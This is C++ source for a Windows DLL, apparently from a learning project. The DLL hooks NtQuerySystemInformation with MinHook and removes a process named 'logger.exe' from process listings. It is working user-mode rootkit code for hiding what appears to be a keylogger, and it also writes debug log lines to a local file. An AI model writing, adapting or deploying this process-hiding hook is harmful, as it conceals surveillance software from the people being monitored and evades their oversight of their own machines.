#include <stdio.h>
#include <fstream>
#include <Windows.h>
#include <MinHook.h>

#if defined _M_X64
#pragma comment(lib, "libMinHook-x64-v140-md.lib")
#elif defined _M_IX86
#pragma comment(lib, "libMinHook-x86-v140-md.lib")
#endif

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	_Field_size_bytes_part_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef enum _SYSTEM_INFORMATION_CLASS {
	SystemBasicInformation,
	SystemCodeIntegrityInformation,
	SystemExceptionInformation,
	SystemInterruptInformation,
	SystemLookasideInformation,
	SystemPerformanceInformation,
	SystemProcessInformation,
	SystemProcessorPerformanceInformation,
	SystemQueryPerformanceCounterInformation,
	SystemRegistryQuotaInformation,
	SystemTimeOfDayInformation,
	SystemPolicyInformation
} SYSTEM_INFORMATION_CLASS;

typedef struct _SYSTEM_PROCESS_INFORMATION
{
	ULONG NextEntryOffset;
	ULONG NumberOfThreads;
	LARGE_INTEGER WorkingSetPrivateSize;
	ULONG HardFaultCount;
	ULONG NumberOfThreadsHighWatermark;
	ULONGLONG CycleTime;
	LARGE_INTEGER CreateTime;
	LARGE_INTEGER UserTime;
	LARGE_INTEGER KernelTime;
	UNICODE_STRING ImageName;
} SYSTEM_PROCESS_INFORMATION, *PSYSTEM_PROCESS_INFORMATION;

typedef NTSTATUS(WINAPI *PNQSI)(
	_In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Inout_   PVOID                    SystemInformation,
	_In_      ULONG                    SystemInformationLength,
	_Out_opt_ PULONG                   ReturnLength
	);

PNQSI pNQSI_WinAPI;

NTSTATUS WINAPI DetourNtQuerySystemInformation(
	_In_      SYSTEM_INFORMATION_CLASS SystemInformationClass,
	_Inout_   PVOID                    SystemInformation,
	_In_      ULONG                    SystemInformationLength,
	_Out_opt_ PULONG                   ReturnLength
)
{
	NTSTATUS status = pNQSI_WinAPI(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);

	// SystemProcessInformation
	if (NT_SUCCESS(status) && SystemInformationClass == 5)
	{
		PSYSTEM_PROCESS_INFORMATION currProc, prevProc;
		currProc = (PSYSTEM_PROCESS_INFORMATION)SystemInformation;

		do
		{
			prevProc = currProc;
			currProc = (PSYSTEM_PROCESS_INFORMATION)((PUCHAR)prevProc + prevProc->NextEntryOffset);

			if (!wcsncmp(currProc->ImageName.Buffer, L"logger.exe", currProc->ImageName.Length))
			{
				if (currProc->NextEntryOffset == 0)
					prevProc->NextEntryOffset = 0;
				else
					prevProc->NextEntryOffset += currProc->NextEntryOffset;
				currProc = prevProc;
			}

		} while (currProc->NextEntryOffset != 0);

	}

	return status;
};

BOOL WINAPI DllMain(HINSTANCE module_handle, DWORD reason_for_call, LPVOID reserved)
{
	static char namefile[] = "E:\\learning\\courses\\logger2\\x64\\Debug\\dll.txt";
	//SetFileAttributes(LPCWSTR(namefile), FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM);
	std::ofstream log(namefile, std::ios::app);
	log << "[+] Start in dll" << std::endl;
	PNQSI pNQSI = (PNQSI)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");

	if (reason_for_call == DLL_PROCESS_ATTACH) // Self-explanatory
	{
		DisableThreadLibraryCalls(module_handle); // Disable DllMain calls for DLL_THREAD_*
		if (reserved == NULL) // Dynamic load
		{
	

			if (MH_Initialize() != MH_OK)
				return false;
			log << "[+] Dynamic load func" << std::endl;
			if (MH_CreateHook(pNQSI, &DetourNtQuerySystemInformation, reinterpret_cast<LPVOID*>(&pNQSI_WinAPI)) != MH_OK)
			{
				log << "[!] Dynamic not loaded func" << std::endl;
				return false;
			}

				if (MH_EnableHook(pNQSI) != MH_OK) {
					log << "[!] Hook not enabled" << std::endl;
					return false;
				}
		}
		else // Static load
		{
			// Return FALSE if you don't want your module to be statically loaded
			return FALSE;
		}
	}

	if (reason_for_call == DLL_PROCESS_DETACH) // Self-explanatory
	{
		if (reserved == NULL) // Either loading the DLL has failed or FreeLibrary was called
		{
			// Cleanup
		}
		else // Process is terminating
		{
			// Cleanup
			log << "[+] Disable my dll" << std::endl;
			MH_DisableHook(&pNQSI);
			MH_Uninitialize();
		}
	}
	log.close();
	return TRUE;
}